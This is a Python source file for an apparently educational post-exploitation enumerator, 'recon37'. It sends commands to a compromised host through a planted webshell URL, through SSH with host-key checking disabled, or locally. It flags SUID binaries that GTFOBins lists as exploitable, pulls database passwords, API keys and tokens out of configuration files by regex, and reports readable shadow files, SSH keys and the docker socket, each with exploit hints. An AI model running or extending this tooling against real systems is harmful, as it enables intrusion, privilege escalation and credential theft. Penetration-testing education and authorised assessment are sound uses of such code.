"""recon37 engine — post-exploitation enumeration."""
from __future__ import annotations

import asyncio
import json
import shlex
import sys
import time
from dataclasses import dataclass, field, asdict
from typing import Literal

import httpx

from recon37.checks import (
    ENUM_CHECKS, GTFOBINS_SUID, TEACHING, ALL_CHECKS,
)


@dataclass
class Finding:
    """A single enumeration finding."""
    category: str
    name: str
    description: str
    output: str
    severity: str = "info"  # info, low, medium, high, critical
    teaching: str = ""
    exploit_suggestion: str = ""


@dataclass
class EnumResult:
    """Result of a post-exploitation enumeration."""
    findings: list[Finding] = field(default_factory=list)
    credentials: list[dict] = field(default_factory=list)
    suid_exploitable: list[dict] = field(default_factory=list)
    duration: float = 0.0
    checks_run: int = 0
    target: str = ""
    mode: str = ""
    error: str | None = None

    def to_json(self) -> str:
        data = {
            "target": self.target,
            "mode": self.mode,
            "duration": self.duration,
            "checks_run": self.checks_run,
            "credentials": self.credentials,
            "suid_exploitable": self.suid_exploitable,
            "findings": [asdict(f) for f in self.findings],
        }
        if self.error:
            data["error"] = self.error
        return json.dumps(data, indent=2)

    def to_human(self) -> str:
        lines = [
            f"\n  \033[96m{'='*60}\033[0m",
            f"  \033[96mrecon37 — Post-Exploitation Report\033[0m",
            f"  \033[96m{'='*60}\033[0m",
            f"  Target: {self.target}",
            f"  Mode: {self.mode}",
            f"  Checks: {self.checks_run} | Duration: {self.duration:.1f}s",
            "",
        ]

        if self.error:
            lines.append(f"  \033[91m[!] Error: {self.error}\033[0m\n")
            return "\n".join(lines)

        # Credentials
        if self.credentials:
            lines.append(f"  \033[92m[+] CREDENTIALS FOUND ({len(self.credentials)}):\033[0m")
            for cred in self.credentials:
                lines.append(f"      Source: {cred.get('source', 'unknown')}")
                lines.append(f"      Value:  {cred.get('value', '')}")
                lines.append("")

        # Exploitable SUID
        if self.suid_exploitable:
            lines.append(f"  \033[92m[+] EXPLOITABLE SUID BINARIES ({len(self.suid_exploitable)}):\033[0m")
            for s in self.suid_exploitable:
                lines.append(f"      {s['path']} — https://gtfobins.github.io/gtfobins/{s['name']}/#suid")
            lines.append("")

        # Group by severity
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        sorted_findings = sorted(self.findings, key=lambda f: severity_order.get(f.severity, 5))

        colors = {"critical": "\033[91m", "high": "\033[91m", "medium": "\033[93m", "low": "\033[94m", "info": "\033[90m"}

        for f in sorted_findings:
            if not f.output.strip():
                continue
            color = colors.get(f.severity, "")
            lines.append(f"  {color}[{f.severity.upper()}] {f.description}\033[0m")
            # Truncate long outputs
            output_lines = f.output.strip().split("\n")
            for ol in output_lines[:15]:
                lines.append(f"    {ol}")
            if len(output_lines) > 15:
                lines.append(f"    ... ({len(output_lines) - 15} more lines)")
            if f.teaching:
                lines.append(f"    \033[93m>>> {f.teaching}\033[0m")
            if f.exploit_suggestion:
                lines.append(f"    \033[92m>>> Try: {f.exploit_suggestion}\033[0m")
            lines.append("")

        return "\n".join(lines)


class CommandExecutor:
    """Base class for command execution backends."""

    async def execute(self, cmd: str) -> str:
        raise NotImplementedError


class LocalExecutor(CommandExecutor):
    """Execute commands locally."""

    async def execute(self, cmd: str) -> str:
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        return stdout.decode("utf-8", errors="replace")


class WebshellExecutor(CommandExecutor):
    """Execute commands via a webshell URL."""

    def __init__(self, webshell_url: str, method: str = "GET", param: str | None = None):
        self.webshell_url = webshell_url
        self.method = method.upper()
        self.param = param
        self._client: httpx.AsyncClient | None = None

    async def _get_client(self) -> httpx.AsyncClient:
        if self._client is None:
            self._client = httpx.AsyncClient(
                timeout=httpx.Timeout(30.0), verify=False,
                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/128.0"},
            )
        return self._client

    async def execute(self, cmd: str) -> str:
        client = await self._get_client()
        try:
            if "{cmd}" in self.webshell_url:
                # URL template mode: replace {cmd}
                import urllib.parse
                url = self.webshell_url.replace("{cmd}", urllib.parse.quote(cmd))
                resp = await client.get(url)
            elif self.method == "POST":
                param_name = self.param or "cmd"
                resp = await client.post(self.webshell_url, data={param_name: cmd})
            else:
                param_name = self.param or "cmd"
                resp = await client.get(self.webshell_url, params={param_name: cmd})
            return resp.text
        except Exception as e:
            return f"[ERROR] {e}"

    async def close(self):
        if self._client:
            await self._client.aclose()


class SSHExecutor(CommandExecutor):
    """Execute commands via SSH."""

    def __init__(self, target: str, password: str | None = None, key: str | None = None, port: int = 22):
        self.target = target
        self.password = password
        self.key = key
        self.port = port

    async def execute(self, cmd: str) -> str:
        ssh_cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes",
                    "-p", str(self.port)]
        if self.key:
            ssh_cmd.extend(["-i", self.key])
        ssh_cmd.extend([self.target, cmd])

        if self.password:
            # Use sshpass if available
            ssh_cmd = ["sshpass", "-p", self.password] + ssh_cmd

        proc = await asyncio.create_subprocess_exec(
            *ssh_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        return stdout.decode("utf-8", errors="replace")


class PostExploit:
    """Post-exploitation enumerator.

    Usage:
        result = await PostExploit(webshell="http://target/shell.php?cmd={cmd}").run()
    """

    def __init__(
        self,
        webshell: str | None = None,
        ssh: str | None = None,
        ssh_password: str | None = None,
        ssh_key: str | None = None,
        ssh_port: int = 22,
        local: bool = False,
        checks: list[str] | None = None,
        verbose: bool = False,
    ):
        self.checks = checks or ALL_CHECKS
        self.verbose = verbose

        if webshell:
            self.executor = WebshellExecutor(webshell)
            self.mode = "webshell"
            self.target = webshell.split("?")[0] if "?" in webshell else webshell
        elif ssh:
            self.executor = SSHExecutor(ssh, password=ssh_password, key=ssh_key, port=ssh_port)
            self.mode = "ssh"
            self.target = ssh
        elif local:
            self.executor = LocalExecutor()
            self.mode = "local"
            self.target = "localhost"
        else:
            raise ValueError(
                "Must specify one of: webshell=, ssh=, local=True\n"
                "  Example: PostExploit(webshell='http://target/shell.php?cmd={cmd}')\n"
                "  Example: PostExploit(ssh='user@target', ssh_password='pass')\n"
                "  Example: PostExploit(local=True)"
            )

    def explain(self) -> str:
        lines = [
            f"I'm going to enumerate the target via {self.mode} ({self.target}).",
            f"Checks to run: {', '.join(self.checks)}",
            "",
            "Specifically, I will:",
        ]
        for check_name in self.checks:
            if check_name in ENUM_CHECKS:
                items = ENUM_CHECKS[check_name]
                lines.append(f"  [{check_name}]")
                for item in items:
                    lines.append(f"    - {item['description']}")
        lines.append("")
        lines.append("All commands are non-destructive (read-only). No files will be modified.")
        return "\n".join(lines)

    def _analyze_suid(self, output: str) -> list[dict]:
        """Cross-reference SUID binaries with GTFOBins."""
        exploitable = []
        for line in output.strip().split("\n"):
            path = line.strip()
            if not path:
                continue
            name = path.rsplit("/", 1)[-1]
            if name in GTFOBINS_SUID:
                exploitable.append({
                    "path": path,
                    "name": name,
                    "gtfobins_url": f"https://gtfobins.github.io/gtfobins/{name}/#suid",
                })
        return exploitable

    def _detect_credentials(self, name: str, output: str) -> list[dict]:
        """Try to extract credentials from output."""
        creds = []
        import re

        if not output.strip():
            return creds

        # wp-config.php patterns
        if "wp-config" in name or "DB_" in output:
            for pattern in [
                r"define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)",
                r"define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)",
                r"define\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'\s*\)",
                r"define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\)",
            ]:
                match = re.search(pattern, output)
                if match:
                    key = pattern.split("'")[1]
                    creds.append({"source": "wp-config.php", "key": key, "value": match.group(1)})

        # Generic password patterns in config files
        for pattern in [
            r'(?:password|passwd|pass)\s*[=:]\s*["\']?([^\s"\']+)',
            r'(?:api_key|apikey|secret|token)\s*[=:]\s*["\']?([^\s"\']+)',
        ]:
            for match in re.finditer(pattern, output, re.IGNORECASE):
                val = match.group(1)
                if len(val) > 2 and val not in ("none", "null", "empty", "changeme", "xxx"):
                    creds.append({"source": name, "value": f"{match.group(0)}"})

        return creds

    async def run(self) -> EnumResult:
        """Run all enumeration checks."""
        start = time.time()
        result = EnumResult(target=self.target, mode=self.mode)
        checks_run = 0

        for check_name in self.checks:
            if check_name not in ENUM_CHECKS:
                print(f"  [!] Unknown check: {check_name}", file=sys.stderr)
                continue

            items = ENUM_CHECKS[check_name]
            print(f"  [*] Running: {check_name} ({len(items)} commands)", file=sys.stderr)

            for item in items:
                checks_run += 1
                if self.verbose:
                    print(f"    > {item['name']}: {item['cmd'][:60]}...", file=sys.stderr)

                try:
                    output = await self.executor.execute(item["cmd"])
                except asyncio.TimeoutError:
                    output = "[TIMEOUT]"
                except Exception as e:
                    output = f"[ERROR] {e}"

                # Determine severity and teaching
                severity = "info"
                teaching = ""
                exploit_suggestion = ""

                if check_name == "suid" and item["name"] == "suid_binaries" and output.strip():
                    exploitable = self._analyze_suid(output)
                    result.suid_exploitable.extend(exploitable)
                    if exploitable:
                        severity = "high"
                        teaching = TEACHING["suid"]
                        exploit_suggestion = f"Check GTFOBins for: {', '.join(e['name'] for e in exploitable[:5])}"

                if item["name"] == "sudo_perms" and output.strip() and "NOPASSWD" in output:
                    severity = "high"
                    teaching = TEACHING["sudo"]

                if item["name"] == "shadow_readable" and output.strip() and ":" in output:
                    severity = "critical"
                    teaching = TEACHING["shadow"]

                if item["name"] == "wp_config" and output.strip() and "DB_PASSWORD" in output:
                    severity = "high"
                    teaching = TEACHING["wp_config"]

                if item["name"] == "ssh_keys" and output.strip() and "id_rsa" in output:
                    severity = "high"
                    teaching = TEACHING["ssh_keys"]

                if item["name"] == "docker_socket" and output.strip() and "docker.sock" in output:
                    severity = "critical"
                    teaching = TEACHING["docker_socket"]

                if item["name"] == "writable_cron" and output.strip():
                    severity = "high"
                    teaching = TEACHING["cron_writable"]

                if item["name"] == "path_writable" and "WRITABLE" in output:
                    severity = "high"
                    teaching = TEACHING["writable_path"]

                if item["name"] == "in_container" and output.strip():
                    severity = "medium"
                    teaching = TEACHING["container"]

                if item["name"] == "env_files" and output.strip():
                    severity = "medium"
                    teaching = TEACHING["env_files"]

                if item["name"] == "credential_files" and output.strip():
                    severity = "medium"
                    teaching = TEACHING["credential_files"]

                # Extract credentials from relevant outputs
                if check_name == "creds":
                    found_creds = self._detect_credentials(item["name"], output)
                    result.credentials.extend(found_creds)
                    if found_creds and severity == "info":
                        severity = "medium"

                result.findings.append(Finding(
                    category=check_name,
                    name=item["name"],
                    description=item["description"],
                    output=output.strip(),
                    severity=severity,
                    teaching=teaching,
                    exploit_suggestion=exploit_suggestion,
                ))

        # Cleanup
        if hasattr(self.executor, "close"):
            await self.executor.close()

        result.checks_run = checks_run
        result.duration = round(time.time() - start, 2)
        return result
